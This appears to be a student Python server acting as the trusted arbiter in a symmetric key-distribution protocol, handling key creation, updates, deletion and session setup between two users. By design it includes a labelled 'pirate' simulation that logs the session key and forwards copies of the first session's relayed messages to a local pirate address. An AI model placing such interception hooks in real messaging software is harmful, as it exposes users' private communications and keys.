import Database
import Cryptage
from FiableSocket import FiableSocket

end = False
nom_arbitre = 'C'

# --- Informations relatives au pirate automatisée ---
# le pirate recevra les messages de seulement la première communication effectuée par 2 utilisateurs.
# Les autres communications ne seront pas reçues par le pirate. Pour que le pirate reçoit d'autres communications, il
# faut relancer le serveur et que 2 utilisateurs rentrent en communication.
pirate_addr = ('localhost', 5001)
pirate_users = [] # Mettre None dans la liste pirate_users et True a pirate_fin pour désactiver le pirate
pirate_fin = False

def recv(socket: FiableSocket) -> None:
    """
    Fonction qui permet de recevoir en boucle les messages des clients
    :param socket: Le socket de connexion
    :return: Le message reçu
    """

    lte_fn = [process_ping, process_T1, process_classic, process_T4_T5]

    while not end:
        addr, msg = socket.recv_queue.get()

        if not end:
            traite = False
            for fn in lte_fn:
                if fn(msg, addr, socket):
                    traite = True
                    break
            if not traite:
                if envoi_message(msg, addr, socket):
                    pass
                else:
                    print("WARN :", addr, "a envoyé un message qui n'a pas été traité / envoyé a son destinataire (" + msg + ")")


def process_ping(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
    """
    Permet de traiter un message de type ping (utilisé par les clients pour tester si le serveur est en ligne)
    :param msg: le message reçu
    :param addr: l'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: True si le message a été traité par cette partie, false sinon
    """
    traite = False
    if msg.upper() == 'PING':
        sck.sendto('PONG', addr)
        traite = True
    return traite


def process_T1(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
    """
    S'occupe du traitement de tous les messages de type T1 (création d'une nouvelle clé)

    Message reçu : <Nom utilisateur, Nom de l’arbitre, T1, clef privé de l’utilisateur>

    Envoi Eclef <Nom de l’arbitre,Nom utilisateur, T1> si la clé a été créée, sinon envoi de
    <Nom de l’arbitre, Nom utilisateur, T1> si la clé n'a pas été créée

    :param msg: Le message reçu
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: true si le message a été traité, false sinon
    """
    traite = False

    msg_split = msg.split(',')
    if len(msg_split) > 3 and msg_split[2] == 'T1':
        nom_util = msg_split[0]
        nom_arbitre = msg_split[1]
        cle = msg_split[3]
        ip = addr[0]
        port = addr[1]

        print('Traitement du message T1 de ' + nom_util + ' (' + msg + ')')

        if Database.create_key(nom_util, cle, ip, port):
            print('La clé de ' + nom_util + ' a été créée !')
            # Envoi de Eclef <Nom de l’arbitre,Nom utilisateur, T1>
            msg = nom_arbitre + ',' + nom_util + ',T1'
            msg = Cryptage.crypter(msg, cle)
            sck.sendto(msg, addr)
        else:
            # Envoi de <Nom de l’arbitre, Nom utilisateur, T1>
            msg = nom_arbitre + ',' + nom_util + ',T1'
            sck.sendto(msg, addr)

        traite = True
    return traite


def process_classic(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
    """
    Permet de vérifier qu'un message donné est bien du type T2, T3 ou T6. Si c'est le cas, lance l'exécution du message
    par le serveur

    Message reçu : - <Nom utilisateur, Nom de l’arbitre, Eold<T2, old clef privée de l’utilisateur, new clef privée>>
                   - <Nom utilisateur, Nom de l’arbitre, Eclef<T3,clef privée>>

    :param msg: Le message reçu
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: true si le message a été traité, false sinon
    """
    traite = False

    msg_splitted = msg.split(',')
    if len(msg_splitted) >= 2 and msg_splitted[1] == nom_arbitre:
        nom_utilisateur = msg_splitted[0]
        cle_chiffrement = Database.get_key(nom_utilisateur)

        if cle_chiffrement is not None:
            # On recherche la partie du message qui est chiffrée
            partie_clair = nom_utilisateur + ',' + nom_arbitre + ','
            partie_chiffree = msg[len(partie_clair):]

            dechiffre = Cryptage.decrypter(partie_chiffree, cle_chiffrement)
            if dechiffre[:2] == 'T2':
                print('Traitement du message T2 de ' + nom_utilisateur + ' (' + msg + ')')
                T2_execute(dechiffre, nom_utilisateur, addr, sck)
                traite |= True
            elif dechiffre[:2] == 'T3':
                print('Traitement du message T3 de ' + nom_utilisateur + ' (' + msg + ')')
                T3_execute(dechiffre, nom_utilisateur, addr, sck)
                traite |= True
    return traite


def process_T4_T5(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
    """
    Permet de vérifier qu'un message donné est bien du type T4. Si c'est le cas, lance l'exécution du message
    par le serveur

    Message reçu : - Eclef< Nom de l’utilisateur A, Nom de l’arbitre, Nom de l’utilisateur B, T4>.
                   - Eclef<Nom utilisateur, T5>.


    :param msg: Le message reçu
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: true si le message a été traité, false sinon
    """

    keys = Database.get_all_keys()
    cle_trouve = False
    index = 0

    while not cle_trouve and index < len(keys):
        key = keys[index]
        msg_dechiffre = Cryptage.decrypter(msg, key)

        if msg_dechiffre[-2:] == 'T4':
            msg_split = msg_dechiffre.split(',')
            if len(msg_split) == 4 and msg_split[1] == nom_arbitre:
                util_a = msg_split[0]
                if key == Database.get_key(util_a):
                    cle_trouve = True
                    print('Traitement du message T4 de ' + util_a + ' (' + msg + ')')
                    T4_execute(msg_dechiffre, util_a, addr, sck)
                else:
                    print("WARN : " + util_a + " a envoyé un message T4 qui a été déchiffré avec une autre clé que la sienne")

        elif msg_dechiffre[-2:] == 'T5':
            msg_split = msg_dechiffre.split(',')
            if len(msg_split) == 2:
                util = msg_split[0]
                if key == Database.get_key(util):
                    cle_trouve = True
                    print('Traitement du message T5 de ' + util + ' (' + msg + ')')
                    T5_execute(msg_dechiffre, util, addr)
                else:
                    print("WARN : " + util + " a envoyé un message T5 qui a été déchiffré avec une autre clé que la sienne")
        index = index + 1
    return cle_trouve


def T2_execute(msg: str, user: str, addr: tuple[str, int], sck: FiableSocket) -> None:
    """
    Fonction utilisée par process_classic et qui s'occupe de mettre à jour la clé de l'utilisateur en vérifiant
    que le message reçu soit valide

    Envoi Enew < Nom utilisateur, Nom de l’arbitre,T2> si la clé a été créée, sinon envoi de
    Eold< Nom de l’arbitre, Nom utilisateur, T2> si la clé n'a pas été créée

    :param msg: La partie du message du protocole T2 qui contient les informations à traiter
                (Eold<T2, old clef privée de l’utilisateur, new clef privée>)
    :param user: L'utilisateur qui a envoyé ce message
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    """

    decode_split = msg.split(',')

    # vérification que l'ancienne clé envoyé par l'utilisateur est la bonne
    if len(decode_split) == 3 and decode_split[1] == Database.get_key(user):
        if Database.update_key(user, decode_split[2]):
            print('La clé de ' + user + ' a été mise à jour !')
        else:
            print('WARN : La clé de ' + user + ' n\'a pas été mise à jour ! (refusé par la base de données)')
    else:
        print('WARN : La clé de ' + user + ' n\'a pas été mise à jour ! (ancienne clé incorrecte)')

    # Envoi du message Enew < Nom utilisateur, Nom de l’arbitre,T2> ou Eold< Nom de l’arbitre, Nom utilisateur, T2>
    # (selon si la clé a été modifiée ou non)
    msg = nom_arbitre + ',' + user + ',T2'
    msg = Cryptage.crypter(msg, Database.get_key(user))
    sck.sendto(msg, addr)


def T3_execute(msg: str, user: str, addr: tuple[str, int], sck: FiableSocket) -> None:
    """
    Fonction utilisée par process_classic et qui s'occupe de supprimer la clé de l'utilisateur en vérifiant
    que le message reçu soit valide

    Envoi Eclef <Nom de l’arbitre, Nom utilisateur, T3>, si la clé a été créée, sinon envoi de
    Eclef <Nom utilisateur, Nom de l’arbitre> si la clé n'a pas été créée

    :param msg: La partie du message du protocole T3 qui contient les informations à traiter
                (Eclef <T3,clef privée>)
    :param user: L'utilisateur qui a envoyé ce message
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: None
    """
    user_key = Database.get_key(user)

    if user_key is not None:
        arbitre_ok = False
        decode_split = msg.split(',')

        if len(decode_split) == 2 and decode_split[1] == user_key:
            if Database.delete_key(user):
                print('La clé de ' + user + ' a été supprimée !')
                arbitre_ok = True
            else:
                print('WARN : La clé de ' + user + ' n\'a pas été supprimée ! (erreur bd)')

        if arbitre_ok:
            msg = nom_arbitre + ',' + user + ',T3'
        else:
            msg = user + ',' + nom_arbitre
        msg = Cryptage.crypter(msg, user_key)
        sck.sendto(msg, addr)


def T4_execute(msg: str, user: str, addr: tuple[str, int], sck: FiableSocket):
    """
    Fonction utilisée par process_T4_T5 et qui s'occupe d'exécuter le message T4 une fois que sa clé a été trouvée
    (Début de discussion entre 2 utilisateurs, génération de KS)

    Envoi Eclef_A<Nom de l’arbitre, Nom utilisateur A, T4, Ks, Eclef_B<Nom de l’arbitre, Nom utilisateur A, Nom utilisateur B, Ks>>
    si l'utilisateur B a été trouvé, sinon envoi de Eclef_A<Nom de l’arbitre, Nom utilisateur A, T4> si l'utilisateur B
    n'a pas été trouvé ou s'il est déjà en ligne avec une autre personne

    :param msg: La partie du message du protocole T4 qui contient les informations à traiter
                (Eclef< Nom de l’utilisateur A, Nom de l’arbitre, Nom de l’utilisateur B, T4>.)
    :param user: L'utilisateur qui a envoyé ce message
    :param addr: L'adresse du client
    :param sck: Le socket à utiliser pour l'envoi
    :return: None
    """
    msg_split = msg.split(',')
    user_b = msg_split[2]

    user_a_key = Database.get_key(user)
    user_b_key = Database.get_key(user_b)

    user_b_dispo = Database.get_destinataire(user_b) is None

    if user_a_key is not None and user_b_key is not None and user_b_dispo:
        # génération de la clé de session
        ks = Cryptage.clefSession(user_a_key, user_b_key)

        # Envoi du message Eclef_A<Nom de l’arbitre, Nom utilisateur A, T4, Ks, Eclef_B<Nom de l’arbitre, Nom utilisateur A, Nom utilisateur B, Ks>>
        msg_partie_b = nom_arbitre + ',' + user + ',' + user_b + ',' + ks
        msg_partie_b = Cryptage.crypter(msg_partie_b, user_b_key)
        msg = nom_arbitre + ',' + user + ',T4,' + ks + ',' + msg_partie_b
        msg = Cryptage.crypter(msg, user_a_key)
        sck.sendto(msg, addr)

        Database.set_destinataire(user, user_b)
        Database.set_destinataire(user_b, user)

        # Mise en place du pirate
        if len(pirate_users) == 0:
            pirate_users.append(user)
            pirate_users.append(user_b)
            print("INFO : Le pirate a été mis en place entre " + user + " et " + user_b + ". La clé de session est " + ks + " (" + str(len(ks)) + ")")
    else:
        # Envoi du message Eclef_A<Nom de l’arbitre, Nom utilisateur A, T4>
        msg = nom_arbitre + ',' + user + ',T4'
        msg = Cryptage.crypter(msg, user_a_key)
        sck.sendto(msg, addr)


def T5_execute(msg: str, user: str, addr: tuple[str, int]):
    """
    Fonction utilisée par process_T4_T5 et qui s'occupe d'exécuter le message T5 une fois que sa clé a été trouvée
    (Débind du destinataire de l'utilisateur qui a envoyé ce message)
    :param msg: Le message de débind émis par l'utilisateur
    :param user: Le nom de l'utilisateur
    :param addr: L'adresse Ip + port du client
    :return: None
    """

    user_conn = Database.get_username(addr)
    if user_conn is not None:
        if user == user_conn:
            Database.set_destinataire(user, None)
            print('Le destinataire de ' + user + ' a été supprimé !')
            if user in pirate_users:
                pirate_fin = True
                print("INFO : Le pirate a été désactivé car " + user + " a quitté sa discussion")

def envoi_message(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
    """
    Permet l'envoi d'un message de l'utilisateur A vers l'utilisateur B.
    :param msg: Le message à transférer
    :param addr: L'adresse de l'utilisateur A
    :param sck: Le socket à utiliser pour l'envoi
    :return: true si l'envoi a été effectué, false sinon
    """

    envoye = False

    nom_util = Database.get_username(addr)
    if nom_util is not None:
        nom_destinataire = Database.get_destinataire(nom_util)
        if nom_destinataire is not None:
            if Database.get_destinataire(nom_destinataire) == nom_util:
                addr_dest = Database.get_addr(nom_destinataire)
                if addr_dest is not None:
                    sck.sendto(msg, addr_dest)
                    envoi_pirate(nom_util, nom_destinataire, msg, sck)
                    envoye = True

    return envoye

def envoi_pirate(envoyeur: str, dest: str, msg: str, sck: FiableSocket) -> None:
    """
    Permet la simulation d'un piratage d'une communication entre 2 utilisateurs. Envoi les messages reçus de la
    communication de ces 2 utilisateurs à un serveur pirate (Voir config dans Arbitre.py)

    /!\ Cette partie n'utilise pas de fiabilisation des échanges de messages /!\

    :param envoyeur: Le nom de l'utilisateur qui a envoyé le message
    :param dest: Le nom de l'utilisateur qui a reçu le message
    :param msg: Le message à envoyer au serveur pirate
    :param sck: Le socket à utiliser pour l'envoi
    :return: None
    """

    if not pirate_fin:
        if dest in pirate_users and envoyeur in pirate_users:
            sck.socket.sendto(msg.encode(), pirate_addr)
